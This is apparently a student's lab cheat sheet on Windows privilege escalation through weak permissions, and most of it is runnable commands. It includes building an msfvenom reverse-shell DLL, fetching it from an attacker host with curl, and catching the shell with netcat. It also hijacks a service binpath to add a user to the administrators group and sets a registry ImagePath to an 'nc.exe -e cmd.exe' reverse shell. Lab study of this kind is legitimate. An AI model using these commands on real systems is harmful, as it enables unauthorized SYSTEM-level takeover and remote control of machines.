# Weak Permissions

## Enumeration

```powershell
whoami /user
net localgroup administrators
whoami /priv
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
[environment]::OSVersion.Version
cmd /c echo %PATH%
tasklist /svc | findstr "rundll32"
taskkill /PID <pid> /F
```

## Payload Prep (If Needed)

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll > srrstr.dll
python3 -m http.server <port>
curl http://<ip>:<port>/srrstr.dll -O "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
nc -lvnp <port>
rundll32 shell32.dll,Control_RunDLL C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
whoami
```

---

## 1. Permissive File System ACLs (SecurityService)

```powershell
.\SharpUp.exe audit
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

## 2. Weak Service Permissions (WindscribeService)

```powershell
SharpUp.exe audit
accesschk.exe /accepteula -quvcw WindscribeService
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
sc stop WindscribeService
sc start WindscribeService
net localgroup administrators
sc config WindscribeService binpath="C:\Program Files (x86)\Windscribe\WindscribeService.exe"
sc start WindscribeService
sc query WindscribeService
```

## 3. Unquoted Service Paths (SystemExplorerHelpService)

```powershell
sc qc SystemExplorerHelpService
wmic service get name,displayname,pathname,startmode |
  findstr /i "auto" |
  findstr /i /v "c:\windows\\" |
  findstr /i /v """
```

## 4. Permissive Registry ACLs (ModelManagerService)

```powershell
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService `
  -Name ImagePath -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## 5. Modifiable Registry Autorun Binary

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

---

# Key Concepts

* Weak or misconfigured Windows permissions allow privilege escalation.
* Services running as SYSTEM are high-value targets.
* Common weaknesses:

  * World-writable service binaries
  * Editable service configurations
  * Unquoted service paths
  * Weak registry permissions (service keys, autoruns)

---

# Approach

1. **Detect Weaknesses:**
   `SharpUp`, `accesschk`, `icacls`, `Get-CimInstance`, `wmic`.

2. **Exploit:**
   Replace service executables, change service binpaths, modify registry entries, restart services.

3. **Verify:**
   `net localgroup administrators`, `sc query`.
